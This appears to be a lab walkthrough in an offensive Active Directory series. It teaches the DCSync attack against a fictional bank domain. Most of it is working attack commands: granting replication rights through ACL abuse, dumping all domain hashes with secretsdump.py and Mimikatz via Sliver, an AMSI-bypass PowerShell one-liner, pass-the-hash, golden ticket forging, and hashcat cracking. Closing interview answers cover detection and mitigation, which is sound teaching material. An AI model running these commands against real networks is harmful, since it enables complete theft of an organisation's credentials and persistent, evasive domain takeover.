# DCSync ATTACK: THE COMPLETE GUIDE
## Stealing EVERY Password in the Domain Without Touching the Domain Controller

> **DCSync is one of the most powerful attacks in Active Directory.**
>
> Instead of dumping credentials from memory (LSASS), you:
> - Pretend to be a Domain Controller
> - Ask the real DC to send you ALL the passwords
> - The DC happily complies (it thinks you're a legitimate DC!)
>
> This guide explains EVERYTHING from the ground up.

---

# TABLE OF CONTENTS

**ABSOLUTE FUNDAMENTALS (START HERE!)**
0. [Understanding DCSync from Zero](#part-0-fundamentals)

**PART 1: Understanding DCSync**
- What is domain replication?
- What is DCSync?
- Why is it so dangerous?

**PART 2: Prerequisites**
- Required permissions
- Getting DCSync rights

**PART 3: The Attack**
- Using secretsdump.py (from Kali)
- Using Mimikatz (via Sliver)
- Targeting specific accounts

**PART 4: Using Dumped Hashes**
- What to do with Administrator hash
- What to do with KRBTGT hash
- Pass-the-Hash everywhere

**PART 5: Interview Questions (10+)**

---

# PART 0: Understanding DCSync from Zero {#part-0-fundamentals}

**Before we attack, let's understand what's really happening.**

---

## 0.1: Why Do Organizations Have Multiple Domain Controllers?

**Large organizations don't rely on a single Domain Controller:**

```
WHY MULTIPLE DOMAIN CONTROLLERS?
────────────────────────────────────────────────────────────────

SCENARIO: Bank with offices in different cities

                    ┌───────────────────┐
                    │   HEADQUARTERS    │
                    │   (New York)      │
                    │   DC01 (Primary)  │
                    └─────────┬─────────┘
                              │
          ┌───────────────────┼───────────────────┐
          │                   │                   │
          ▼                   ▼                   ▼
    ┌───────────┐      ┌───────────┐      ┌───────────┐
    │ BRANCH 1  │      │ BRANCH 2  │      │ BRANCH 3  │
    │ (London)  │      │ (Tokyo)   │      │ (Mumbai)  │
    │ DC02      │      │ DC03      │      │ DC04      │
    └───────────┘      └───────────┘      └───────────┘

REASONS:
1. REDUNDANCY - If DC01 dies, DC02 takes over
2. SPEED - Users in Tokyo log in faster via DC03 (local)
3. LOAD BALANCING - Spread authentication load

BUT... all DCs need the SAME data!
When you change your password on DC01, DC02/DC03/DC04 need to know!
```

---

## 0.2: What is Domain Replication?

**Replication = How Domain Controllers share data with each other.**

```
DOMAIN REPLICATION - SIMPLE VERSION:
────────────────────────────────────────────────────────────────

STEP 1: User "vamsi" changes password on DC01 (New York)

STEP 2: DC01 says to other DCs:
        "Hey everyone! vamsi's password changed.
         Here's the new password HASH."

STEP 3: DC02, DC03, DC04 receive and store the new hash

STEP 4: Now vamsi can log in at ANY branch!
        (All DCs have his new password hash)


THIS IS CALLED REPLICATION:
DC01 ←──[Sync]──→ DC02
          ↕
        DC03
          ↕
        DC04
```

**What data gets replicated?**
- User password hashes (NTLM hashes)
- User account information
- Group memberships
- Computer accounts
- EVERYTHING in Active Directory!

---

## 0.3: The Protocol - DRSUAPI (The Technical Part)

**Microsoft created a protocol for replication called DRSUAPI:**

```
DRSUAPI = Directory Replication Service Remote Protocol
────────────────────────────────────────────────────────────────

This is the "language" Domain Controllers use to sync data.

NORMAL REPLICATION:
DC02: "Hey DC01, give me any changes since my last sync"
DC01: "Sure! Here's vamsi's new password hash, and lakshmi got 
       added to the IT_Team group"
DC02: "Thanks!" *stores the changes*

TECHNICAL BREAKDOWN:
1. DC02 connects to DC01 via RPC (Remote Procedure Call)
2. DC02 calls DRSGetNCChanges() function
3. DC01 returns the requested data
4. DC02 processes and stores it
```

**Key insight:** The DC doesn't verify WHO is asking - it just checks PERMISSIONS!

---

## 0.4: The DCSync Attack - What It Really Does

**DCSync = Pretending to be a Domain Controller to request replication data**

```
DCSync ATTACK - VISUAL EXPLANATION:
────────────────────────────────────────────────────────────────

NORMAL REPLICATION:
┌─────────────┐                           ┌─────────────┐
│    DC02     │ ────[DRSGetNCChanges()]──→│    DC01     │
│  (Real DC)  │                           │  (Real DC)  │
│             │ ←────[Password Hashes]────│             │
└─────────────┘                           └─────────────┘
     ✓ This is normal. DC01 gives data to DC02.


DCSync ATTACK:
┌─────────────┐                           ┌─────────────┐
│  ATTACKER   │ ────[DRSGetNCChanges()]──→│    DC01     │
│  (WS01)     │                           │  (Real DC)  │
│             │ ←────[Password Hashes]────│             │
└─────────────┘                           └─────────────┘
     ! DC01 thinks it's talking to another DC!
     ! It sends ALL the password hashes!


WHY DOES DC01 GIVE THE DATA?
─────────────────────────────
DC01 doesn't check: "Is this a Domain Controller?"
DC01 checks: "Does this account have replication rights?"

If the account has the right permissions, DC01 complies!
```

---

## 0.5: What Permissions Are Needed?

**Two specific permissions on the Domain object:**

| Permission | Technical Name | What It Does |
|------------|---------------|--------------|
| **Replicating Directory Changes** | DS-Replication-Get-Changes | Request basic replication |
| **Replicating Directory Changes All** | DS-Replication-Get-Changes-All | Request SECRET data (hashes!) |

**Who has these permissions by default?**

| Account/Group | Has DCSync Rights? |
|---------------|-------------------|
| Domain Admins | ✅ YES |
| Enterprise Admins | ✅ YES |
| Administrators | ✅ YES |
| Domain Controllers (computers) | ✅ YES |
| Regular users | ❌ NO |

**But here's the catch:**
If you can MODIFY the Domain object's permissions (ACL abuse), you can GRANT these rights to anyone!

---

## 0.6: Why DCSync is So Powerful

**Compare DCSync to other hash dumping methods:**

```
COMPARISON OF HASH DUMPING METHODS:
────────────────────────────────────────────────────────────────

METHOD               │ ACCESS NEEDED       │ WHAT YOU GET      │ STEALTHY?
────────────────────────────────────────────────────────────────
LSASS Dump           │ Admin on machine    │ Logged-in users   │ No (EDR detects)
SAM Dump             │ Admin on machine    │ Local accounts    │ Somewhat
NTDS.dit Copy        │ SYSTEM on DC        │ ALL accounts      │ No (very noisy)
DCSync               │ Replication rights  │ ALL accounts      │ YES! (looks normal)
────────────────────────────────────────────────────────────────

DCSync ADVANTAGES:
1. REMOTE - Don't need to be ON the DC
2. STEALTHY - Traffic looks like normal DC replication
3. COMPLETE - Get EVERY account, not just logged-in ones
4. OFFICIAL PROTOCOL - Uses Microsoft's own replication system
5. KRBTGT - Get the Golden Ticket key!
```

---

## 0.7: What Can You Get with DCSync?

**EVERYTHING in Active Directory:**

| Data | Why It Matters |
|------|----------------|
| **Administrator hash** | Pass-the-Hash to any machine |
| **KRBTGT hash** | Create Golden Tickets (permanent access!) |
| **All user hashes** | Crack passwords, impersonate anyone |
| **Service account hashes** | Access services, lateral movement |
| **Computer account hashes** | Silver Tickets for specific services |

---

## 0.8: The Attack Flow - Step by Step

```
DCSync ATTACK FLOW:
────────────────────────────────────────────────────────────────

STEP 1: Get DCSync Rights
        ├── Option A: Already Domain Admin
        └── Option B: ACL Abuse (WriteDACL on Domain object)

STEP 2: Connect to Domain Controller
        └── Uses RPC over TCP (port 135, high ports)

STEP 3: Call Replication Functions
        └── DRSGetNCChanges() via DRSUAPI

STEP 4: DC Returns Password Hashes
        └── All accounts, including KRBTGT!

STEP 5: Use the Hashes
        ├── Pass-the-Hash as Administrator
        ├── Golden Ticket with KRBTGT
        └── Crack passwords offline
```

---

## 0.9: Summary Before Attacking

| Concept | What It Is |
|---------|-----------|
| **Domain Replication** | How DCs share data with each other |
| **DRSUAPI** | The protocol used for replication |
| **DCSync** | Pretending to be a DC to request replication |
| **Required Rights** | DS-Replication-Get-Changes-All |
| **What You Get** | EVERY password hash in the domain |
| **Key Target** | KRBTGT hash (for Golden Tickets) |

**Now let's execute the attack...**

---

# PART 1: Understanding DCSync (Technical Details)

## 1.1: What is Domain Replication?

**Domain Replication = How Domain Controllers share data**

```
DOMAIN REPLICATION:
───────────────────

In an organization with multiple Domain Controllers:
DC01 (Primary)  ←──────→  DC02 (Backup)
                    ↕
              DC03 (Remote Site)

When you change a password on DC01:
→ DC01 tells DC02: "Hey, user X changed password"
→ DC02 copies the new hash
→ Now DC02 has the latest password

This is called REPLICATION.
```

### The Protocol: MS-DRSR (Directory Replication Service Remote Protocol)

Microsoft created this protocol for DCs to sync.

**Normal use:** DC01 asks DC02 "Give me changes since last sync"
**Attack use:** WE ask DC01 "Give me changes" (pretending to be a DC!)

---

## 1.2: What is DCSync?

**DCSync = Pretending to be a Domain Controller to request replication data**

```
DCSYNC ATTACK:
──────────────

Normal:
DC02 (real DC) ────[Replication Request]────→ DC01
               ←────[Password Hashes]────────

DCSync Attack:
Attacker's PC ────[Replication Request]────→ DC01
               ←────[Password Hashes]────────

DC01 thinks: "Oh, another DC wants data, here you go!"
```

**The magic:** You never touch DC01's memory or files. It GIVES you the hashes!

---

## 1.3: Why is DCSync Devastating?

```
WHY DCSYNC IS THE BEST HASH DUMPING METHOD:
───────────────────────────────────────────

1. REMOTE - You don't need to be on the DC
2. STEALTHY - Looks like normal DC traffic
3. COMPLETE - Gets EVERY account, not just logged-in users
4. RELIABLE - Uses official Microsoft protocol
5. GETTING KRBTGT - Required for Golden Ticket

COMPARED TO OTHER METHODS:
┌─────────────────────────────────────────────────────────────┐
│ Method          │ Requires │ Gets        │ Risk           │
├─────────────────────────────────────────────────────────────┤
│ LSASS Dump      │ SYSTEM   │ Logged-in   │ EDR detects    │
│ SAM Dump        │ SYSTEM   │ Local only  │ Very limited   │
│ NTDS.dit Copy   │ SYSTEM   │ All         │ Very noisy     │
│ DCSync          │ DCSync   │ All         │ Looks normal!  │
└─────────────────────────────────────────────────────────────┘
```

---

## 1.4: Real-World Analogy

```
DCSYNC = CALLING HR PRETENDING TO BE ANOTHER OFFICE

Normal:
Branch Manager: "HR, I'm opening a new branch. Send me all employee records."
HR: "Sure, here's everyone's SSN and salary."

Attack:
Attacker: "Hi HR, I'm the new branch manager. Send me all employee records."
HR: "Sure, here's everyone's SSN and salary."

HR didn't verify because it's a "trusted internal request."
Same with Domain Controllers!
```

---

# 📖 PART 2: Prerequisites

## 2.1: Required Permissions

**DCSync requires specific replication rights:**

| Right | GUID | Description |
|-------|------|-------------|
| DS-Replication-Get-Changes | 1131f6aa-9c07-... | Basic replication |
| DS-Replication-Get-Changes-All | 1131f6ad-9c07-... | Full replication (secrets) |

**Who has these by default?**
- Domain Admins ✅
- Enterprise Admins ✅
- Domain Controllers ✅
- Administrators ✅

---

## 2.2: Getting DCSync Rights via ACL Abuse

If you used Walkthrough 06 (ACL Abuse) with WriteDACL:

```bash
# Grant yourself DCSync rights
Add-DomainObjectAcl -TargetIdentity 'DC=orsubank,DC=local' -PrincipalIdentity vamsi.krishna -Rights DCSync
```

Now `vamsi.krishna` can DCSync without being DA!

---

# 📖 PART 3: The DCSync Attack

## 3.1: Method 1 - secretsdump.py (From Kali)

**The EASIEST way to DCSync. Works remotely!**

### Dump ALL hashes:
```bash
secretsdump.py orsubank.local/lakshmi.devi:'NewPassword123!'@DC01.orsubank.local
```

**What this does:**
- `orsubank.local/lakshmi.devi` = Domain user (needs DCSync rights)
- `:'NewPassword123!'` = Password
- `@DC01.orsubank.local` = Target DC

### Output:
```
Impacket v0.10.0

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x1234567890abcdef...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
[*] NL$KM 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4:::
vamsi.krishna:1103:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lakshmi.devi:1104:aad3b435b51404eeaad3b435b51404ee:5e89d7a2b3c4f5e6d7a8b9c0d1e2f3a4:::
ammulu.orsu:1105:aad3b435b51404eeaad3b435b51404ee:4d3c2b1a9e8f7d6c5b4a3d2c1b0a9e8f:::
pranavi:1106:aad3b435b51404eeaad3b435b51404ee:7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d:::
...
```

**BOOM! You have EVERY hash in the domain!**

---

### 3.1.2: Dump Just KRBTGT:
```bash
secretsdump.py orsubank.local/lakshmi.devi:'NewPassword123!'@DC01.orsubank.local -just-dc-user krbtgt
```

---

### 3.1.3: Using Hash Instead of Password:
```bash
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 orsubank.local/lakshmi.devi@DC01.orsubank.local
```

---

## 3.2: Method 2 - Mimikatz DCSync (via Sliver)

**Use when you already have a shell on a domain-joined machine.**

### AMSI Bypass First:
```bash
[server] sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike '*si*tils'){$t.GetFields('NonPublic,Static')|%{if($_.Name -clike '*ailed'){$_.SetValue($null,$true)}}}}"
```

### DCSync All Accounts:
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "lsadump::dcsync /domain:orsubank.local /all /csv" "exit"
```

### DCSync Specific User (KRBTGT):
```bash
[server] sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Mimikatz.exe "lsadump::dcsync /domain:orsubank.local /user:krbtgt" "exit"
```

### Output:
```
[DC] 'orsubank.local' will be the domain
[DC] 'DC01.orsubank.local' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **
SAM Username         : krbtgt
User Principal Name  : krbtgt@orsubank.local
Account Type         : 30000000 (USER_OBJECT)

Credentials:
  Hash NTLM: a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4
```

---

# 📖 PART 4: Using Dumped Hashes

## 4.1: Using Administrator Hash

**Pass-the-Hash to DC:**
```bash
crackmapexec smb DC01.orsubank.local -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -d orsubank.local
```

**Get a shell on DC:**
```bash
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@DC01.orsubank.local
```

You're now SYSTEM on the Domain Controller!

---

## 4.2: Using KRBTGT Hash

**Create Golden Ticket (Walkthrough 08):**
```bash
kerberos::golden /user:FakeAdmin /domain:orsubank.local /sid:S-1-5-21-... /krbtgt:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 /ptt
```

**Unlimited domain access forever!**

---

## 4.3: Mass Password Cracking

**Save hashes to file:**
```bash
secretsdump.py ... > all_hashes.txt
```

**Extract just the NTLM hashes:**
```bash
cat all_hashes.txt | grep ':::' | cut -d':' -f4 | sort -u > ntlm_only.txt
```

**Crack with hashcat:**
```bash
hashcat -m 1000 ntlm_only.txt /usr/share/wordlists/rockyou.txt
```

---

# 📖 PART 5: Interview Questions

## Q1: "What is DCSync and how does it work?"

**YOUR ANSWER:**
"DCSync is an attack technique where an attacker impersonates a Domain Controller to request password hash data. It leverages the MS-DRSR (Directory Replication Service Remote Protocol), which Domain Controllers use to synchronize the Active Directory database.

When you have the proper replication rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All), you can request that a DC send you the password hashes for any or all domain accounts. The DC cannot distinguish this from a legitimate replication request.

This attack is powerful because:
1. It works remotely - no need to access DC memory/disk
2. It bypasses most EDR - looks like legitimate DC traffic
3. It gets all accounts including KRBTGT
4. It uses official Microsoft protocols

Tools like Mimikatz (lsadump::dcsync) and Impacket's secretsdump.py implement this attack."

---

## Q2: "What permissions do you need to perform DCSync?"

**YOUR ANSWER:**
"DCSync requires two specific extended rights on the domain object:

1. **DS-Replication-Get-Changes** (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
   - Allows replication of non-secret data

2. **DS-Replication-Get-Changes-All** (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
   - Allows replication of secret data (password hashes)

Both are required to actually extract credentials.

By default, these rights are granted to:
- Domain Admins
- Enterprise Admins
- Administrators
- Domain Controllers

However, through ACL abuse (if I have WriteDACL on the domain), I can grant these rights to any user, enabling DCSync without being Domain Admin."

---

## Q3: "How do you detect DCSync attacks?"

**YOUR ANSWER:**
"DCSync detection focuses on anomalous replication:

1. **Event ID 4662** - Directory Service Access
   - Look for access to 'DS-Replication-Get-Changes-All' GUID
   - From non-DC computers

2. **Network Traffic Analysis**
   - DRSUAPI calls from non-DC IP addresses
   - Unusual replication patterns

3. **Endpoint Indicators**
   - Mimikatz signatures in memory
   - secretsdump.py network patterns

4. **Baseline Monitoring**
   - Track which accounts have replication rights
   - Alert on changes to domain object ACL

The challenge is distinguishing legitimate DC-to-DC replication from attacks. Solutions like Microsoft ATA/Defender for Identity specifically detect DCSync patterns."

---

## Q4: "What's the difference between DCSync and dumping NTDS.dit?"

**YOUR ANSWER:**
"Both get all domain hashes, but the methods differ significantly:

**DCSync:**
- Uses replication protocol (DRSUAPI)
- Works remotely from any domain-joined machine
- Requires DCSync rights (but not local DC access)
- Looks like normal replication traffic
- Stealthier at network level

**NTDS.dit Dumping:**
- Requires SYSTEM access on the DC
- Must copy the NTDS.dit file
- Need to extract hashes offline (ntdsutil, Volume Shadow Copy)
- Very obvious on the DC - file access, service stops
- Often detected by EDR

In practice, I prefer DCSync because it's remote and cleaner. NTDS.dit dumping is a fallback when DCSync isn't possible (like no network route to DC)."

---

## Q5: "How do you mitigate DCSync attacks?"

**YOUR ANSWER:**
"Mitigation involves multiple layers:

1. **Limit Replication Rights**
   - Audit who has DCSync rights: `Get-DomainObjectAcl -SearchBase "DC=domain,DC=com" -ResolveGUIDs | ? {$_.ObjectAceType -match 'replication'}`
   - Remove unnecessary grants

2. **Protect Domain Admins**
   - Use Privileged Access Workstations (PAWs)
   - Implement Admin Tier model
   - Use Credential Guard

3. **Monitor ACL Changes**
   - Alert on modifications to domain object DACL
   - Track changes to replication rights

4. **Detection**
   - Deploy Microsoft Defender for Identity
   - Monitor Event ID 4662 for replication access
   - Alert on DCSync from non-DC hosts

5. **Network Segmentation**
   - Restrict which machines can talk to DCs on replication ports"

---

# ✅ CHECKLIST

- [ ] Obtained Domain Admin or DCSync rights
- [ ] Ran secretsdump.py to dump all hashes
- [ ] Extracted Administrator hash
- [ ] Extracted KRBTGT hash
- [ ] Verified Pass-the-Hash works with Administrator
- [ ] Created Golden Ticket with KRBTGT (Walkthrough 08)
- [ ] Saved hashes for offline cracking

---

# 🔗 What's Next?

**Now that you have KRBTGT:**
→ **[07. Golden Ticket](./07_golden_ticket.md)** (Permanent domain access)

**For lateral movement with hashes:**
→ **[06. Pass-the-Hash](./06_pass_the_hash.md)**

**For alternative Kerberos attacks:**
→ **[06b. Pass-the-Ticket](./06b_pass_the_ticket.md)**

---

**MITRE ATT&CK Mapping:**
| Technique | ID | Description |
|-----------|-----|-------------|
| OS Credential Dumping: DCSync | T1003.006 | DCSync Attack |
| Account Manipulation | T1098 | Granting DCSync rights via ACL abuse |

**Difficulty:** ⭐⭐⭐ (Intermediate)
**Interview Importance:** ⭐⭐⭐⭐⭐ (Core credential access technique)

---
